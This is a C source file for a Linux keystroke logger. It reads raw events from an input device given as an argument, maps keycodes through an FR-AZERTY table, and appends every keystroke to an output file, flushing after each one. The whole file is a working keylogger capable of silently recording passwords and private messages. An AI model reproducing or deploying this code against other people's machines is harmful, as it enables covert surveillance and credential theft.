#include <linux/input.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
 
#define bool __u8
#define true 1
#define false 0
 
struct key
{
    __u16 code;
    char character;
    char upper_character;
    char alt_gr_character;
};
 
// This mapping represent an "FR - AZERTY" layout.
// Not all keycodes are supported (in particular characters such as éèàç)
// The program prints unknown characters in the console, it's quite easy to add new codes
struct key keys[] = {
    {16, 'a', 'A', '\0'},
    {48, 'b', 'B', '\0'},
    {46, 'c', 'C', '\0'},
    {32, 'd', 'D', '\0'},
    {18, 'e', 'E', '\0'},
    {33, 'f', 'F', '\0'},
    {34, 'g', 'G', '\0'},
    {35, 'h', 'H', '\0'},
    {23, 'i', 'I', '\0'},
    {36, 'j', 'J', '\0'},
    {37, 'k', 'K', '\0'},
    {38, 'l', 'L', '\0'},
    {39, 'm', 'M', '\0'},
    {49, 'n', 'N', '\0'},
    {24, 'o', 'O', '\0'},
    {25, 'p', 'P', '\0'},
    {30, 'q', 'Q', '\0'},
    {19, 'r', 'R', '\0'},
    {31, 's', 'S', '\0'},
    {20, 't', 'T', '\0'},
    {22, 'u', 'U', '\0'},
    {47, 'v', 'V', '\0'},
    {44, 'w', 'W', '\0'},
    {45, 'x', 'X', '\0'},
    {21, 'y', 'Y', '\0'},
    {17, 'z', 'Z', '\0'},
 
    {2, '&', '1', '\0'},
    {3, '\0', '2', '~'},
    {4, '"', '3', '#'},
    {5, '\'', '4', '{'},
    {6, '(', '5', '['},
    {7, '-', '6', '|'},
    {8, '\0', '7', '`'},
    {9, '_', '8', '\\'},
    {10, '\0', '9', '^'},
    {11, '\0', '0', '@'},
    {12, ')', '\0', ']'},
    {13, '=', '+', '}'},
 
    {86, '<', '>', '\0'},
    {40, '\0', '%', '\0'},
    {43, '*', '\0', '\0'},
    {26, '^', '\0', '\0'},
    {27, '$', '\0', '\0'},
    {50, ',', '?', '\0'},
    {51, ';', '.', '\0'},
    {52, ':', '/', '\0'},
    {53, '!', '\0', '\0'},
 
    {28, '\n', '\n', '\n'},
    {57, ' ', ' ', ' '},
 
    // Numpad
    {96, '\n', '\n', '\n'},
    {79, '1', '1', '1'},
    {80, '2', '2', '2'},
    {81, '3', '3', '3'},
    {75, '4', '4', '4'},
    {76, '5', '5', '5'},
    {77, '6', '6', '6'},
    {71, '7', '7', '7'},
    {72, '8', '8', '8'},
    {73, '9', '9', '9'},
    {82, '0', '0', '0'},
 
    {78, '+', '+', '+'},
    {74, '-', '-', '-'},
    {83, '.', '.', '.'},
};
 
char translate_character(__u16 keycode, bool upper, bool alt_gr)
{
    if(upper && alt_gr)
    {
        printf("Error: upper+alt_gr detected, don't know what to do :(");
        return '\0';
    }
 
    size_t i = 0;
    for(; i < sizeof(keys)/sizeof(struct key); i++)
        if(keys[i].code == keycode)
            if(upper) return keys[i].upper_character;
            else if(alt_gr) return keys[i].alt_gr_character;
            else return keys[i].character;
 
    //Keycode not found
    return '\0';
}
 
int main(int argc, char **argv)
{
    if(argc != 3)
    {
        printf("Usage: %s [INPUT DEVICE] [OUTPUT FILE]\n", argv[0]);
        return 1;
    }
 
    FILE *input_file = fopen(argv[1], "rb");
 
    if(input_file == NULL)
    {
        printf("Can't read %s\n", argv[1]);
        return 1;
    }
 
    FILE *output_file = fopen(argv[2], "w");
 
    if(output_file == NULL)
    {
        printf("Can't write %s\n", argv[2]);
        fclose(input_file);
        return 1;
    }
 
    struct input_event ev;
    struct timeval last_time;
    int bytes_read;
    bool upper = false, alt_gr = false;
 
    do
    {
        bytes_read = fread(&ev, sizeof(struct input_event), 1, input_file);
 
        if(ev.type == 1)
        {
            switch(ev.value)
            {
            case 0: //key release
 
                if(ev.code == 42 || ev.code == 54) //shift
                    upper = false;
 
                else if(ev.code == 100) //alt gr
                    alt_gr = false;
 
                break;
 
            case 1: //key press
            case 2: //key 'repeat'
 
                if(ev.code == 42 || ev.code == 54)
                {
                    upper = true;
                    break;
                }
 
                else if(ev.code == 100)
                {
                    alt_gr = true;
                    break;
                }
 
                else if(ev.code == 1)
                    fputs("[ECHAP]", output_file);
 
                else if(ev.code == 14)
                    fputs("[BACKSPACE]", output_file);
 
                else if(ev.code == 15)
                    fputs("[TAB]", output_file);
   
                else if(ev.code == 29)
                    fputs("[CTRL]", output_file);
 
                else if(ev.code == 56)
                    fputs("[ALT]", output_file);
 
                else if(ev.code == 103)
                {
                    fputs("[UP]", output_file);
                    printf("[UP] timestamp: %ld\n", ev.time.tv_sec);
                }
 
                else if(ev.code == 105)
                    fputs("[LEFT]", output_file);
 
                else if(ev.code == 106)
                    fputs("[RIGHT]", output_file);
 
                else if(ev.code == 108)
                    fputs("[DOWN]", output_file);
 
                else
                {
                    char character = translate_character(ev.code, upper, alt_gr);
               
                    if(!character)
                        printf("\nUnknown keycode: %i\n", ev.code);
 
                    else
                        fputc((int)character, output_file);
                }
 
                fflush(output_file); // We ensure data are written immediatly to the file
                break;
            }
        }
    } while(bytes_read);
 
    fclose(input_file);
    fclose(output_file);
}